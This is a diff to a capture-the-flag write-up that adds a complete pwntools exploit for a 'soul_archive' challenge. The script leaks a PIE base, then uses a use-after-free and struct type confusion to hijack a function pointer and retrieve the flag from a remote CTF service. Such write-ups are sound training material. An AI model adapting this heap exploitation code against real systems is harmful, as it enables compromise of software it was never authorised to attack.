@@ -144,63 +144,130 @@ By setting `TransferRecord.timestamp = 0x50574e534f554c53ULL` and `TransferRecor
 
 ## Step 5 — Remote Exploitation & Flag Retrieval
 
-### Exploit Script (`exploit.py`)
+### Complete Exploit Script (`solve.py`)
 
 ```python
 #!/usr/bin/env python3
+"""
+SOUL // MEMORY OF THANOS - Type Confusion & UAF Exploit
+Author: Suyog Jadhav
+Category: Binary Exploitation / Pwn (Hard)
+Target: glibc heap UAF & struct Type Confusion
+"""
+
+import re
+import sys
 from pwn import *
 
 context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-h']
 
+# Target configuration
 HOST = "145.239.142.129"
 PORT = 1339
 
-io = remote(HOST, PORT)
+def get_process():
+    if args.REMOTE:
+        return remote(HOST, PORT)
+    else:
+        bin_path = "./challenge/soul_archive" if os.path.exists("./challenge/soul_archive") else "./soul_archive"
+        return process(bin_path)
 
-def store_soul(name, essence=1):
+def store_soul(io, name, soul_type=1, essence="1000"):
     io.sendlineafter(b"Choice > ", b"1")
-    io.sendlineafter(b"name: ", name)
-    io.sendlineafter(b"essence: ", str(essence).encode())
+    io.sendlineafter(b"Soul name: ", name)
+    io.sendlineafter(b"Type: ", str(soul_type).encode())
+    io.sendlineafter(b"Initial Essence (hex value e.g. 1000): ", essence.encode())
 
-def inspect_soul(idx):
+def inspect_soul(io, idx):
     io.sendlineafter(b"Choice > ", b"2")
-    io.sendlineafter(b"Index: ", str(idx).encode())
+    io.sendlineafter(b"Enter vessel index (0-7): ", str(idx).encode())
+    return io.recvuntil(b"=== SOUL ARCHIVE ===")
 
-def merge_souls(a, b):
+def merge_souls(io, a, b):
     io.sendlineafter(b"Choice > ", b"3")
-    io.sendlineafter(b"First: ", str(a).encode())
-    io.sendlineafter(b"Second: ", str(b).encode())
+    io.sendlineafter(b"First vessel index to merge: ", str(a).encode())
+    io.sendlineafter(b"Second vessel index to merge: ", str(b).encode())
 
-def erase_soul(idx):
+def erase_soul(io, idx):
     io.sendlineafter(b"Choice > ", b"4")
-    io.sendlineafter(b"Index: ", str(idx).encode())
+    io.sendlineafter(b"Enter vessel index to erase (0-7): ", str(idx).encode())
 
-def transfer_record(realm, timestamp, audit_callback):
+def transfer_soul(io, realm, transfer_id, flags, timestamp, raw_entropy, audit_callback):
     io.sendlineafter(b"Choice > ", b"5")
-    io.sendlineafter(b"realm: ", realm)
-    io.sendlineafter(b"timestamp: ", str(timestamp).encode())
-    io.sendlineafter(b"callback: ", str(audit_callback).encode())
+    io.sendlineafter(b"Realm of origin: ", realm)
+    io.sendlineafter(b"Transfer ID (decimal): ", str(transfer_id).encode())
+    io.sendlineafter(b"Entropy Flags (decimal): ", str(flags).encode())
+    io.sendlineafter(b"Timestamp (hex e.g. 1337): ", hex(timestamp)[2:].encode())
+    io.sendlineafter(b"Raw Entropy / Essence (hex): ", hex(raw_entropy)[2:].encode())
+    io.sendlineafter(b"Audit Callback Address (hex, 0 for default): ", hex(audit_callback)[2:].encode())
 
-# 1. Allocate 6 souls to satisfy total_captured >= 6
-for i in range(6):
-    store_soul(f"Soul{i}".encode())
+def exploit():
+    io = get_process()
 
-# 2. Perform 3 merges (merges_performed == 3)
-merge_souls(0, 1) # s_b at index 1 freed to 0x50 tcache!
-merge_souls(2, 3)
-merge_souls(4, 5)
+    log.info("Step 1: Capturing 6 souls (total_captured >= 6)...")
+    # Soul 0: Human (type 1) -> inspect_human function pointer is assigned
+    store_soul(io, b"Human0", soul_type=1)
+    store_soul(io, b"Vessel1", soul_type=2)
+    store_soul(io, b"Vessel2", soul_type=3)
+    store_soul(io, b"Vessel3", soul_type=4)
+    store_soul(io, b"Vessel4", soul_type=1)
+    store_soul(io, b"Vessel5", soul_type=2)
 
-# 3. Erase 1 soul (souls_erased == 1)
-erase_soul(2)
+    log.info("Step 2: Inspecting Vessel 0 to leak PIE base...")
+    leak_data = inspect_soul(io, 0)
+    match = re.search(rb"Inspect Callback: (0x[0-9a-fA-F]+)", leak_data)
+    if not match:
+        log.error("Failed to leak callback address!")
+        return
 
-# 4. Allocate TransferRecord over the freed chunk at index 1
-# timestamp = 0x50574e534f554c53 ("PWNSOULS")
-# audit_callback = soul_ascension address
-transfer_record(b"Titan", 0x50574e534f554c53, ascension_addr)
+    leak_inspect = int(match.group(1), 16)
+    # Symbol offsets: inspect_human = 0x13a9, soul_ascension = 0x14fb
+    pie_base = leak_inspect - 0x13a9
+    soul_ascension = pie_base + 0x14fb
+    log.success(f"Leaked inspect_human: {hex(leak_inspect)}")
+    log.success(f"Calculated PIE Base:   {hex(pie_base)}")
+    log.success(f"Target soul_ascension: {hex(soul_ascension)}")
 
-# 5. Trigger inspect_soul(1) -> executes audit_callback(s)
-inspect_soul(1)
-io.interactive()
+    log.info("Step 3: Executing 3 merges (merges_performed == 3)...")
+    # Merging vessel 1 frees its struct Soul into the 0x50 tcache bin!
+    # Due to missing pointer zeroing, archive[1] remains a dangling pointer (UAF)
+    merge_souls(io, 0, 1)
+    merge_souls(io, 2, 3)
+    merge_souls(io, 4, 5)
+
+    log.info("Step 4: Erasing 1 vessel (souls_erased == 1)...")
+    erase_soul(io, 2)
+
+    log.info("Step 5: Allocating TransferRecord over freed Soul at index 1 (Type Confusion)...")
+    # We populate the exact fields corresponding to struct Soul:
+    # TransferRecord.timestamp (offset 32)      -> Soul.essence = 0x50574e534f554c53 ("PWNSOULS")
+    # TransferRecord.audit_callback (offset 56) -> Soul.inspect = soul_ascension
+    SECRET_MAGIC = 0x50574E534F554C53  # "PWNSOULS"
+    transfer_soul(
+        io,
+        realm=b"VormirChamber",
+        transfer_id=1337,
+        flags=1,
+        timestamp=SECRET_MAGIC,
+        raw_entropy=0x1000,
+        audit_callback=soul_ascension
+    )
+
+    log.info("Step 6: Triggering hijacked inspect callback on dangling Vessel 1...")
+    # inspect_soul(1) calls s->inspect(s), which invokes soul_ascension(s)
+    flag_output = inspect_soul(io, 1)
+    log.success("Ascension triggered! Recovered Flag:")
+    
+    for line in flag_output.splitlines():
+        if b"OWASP{" in line:
+            print(f"[+] Flag: {line.decode().strip()}")
+            break
+
+    io.interactive()
+
+if __name__ == "__main__":
+    exploit()
 ```
 
 Executing the exploit:
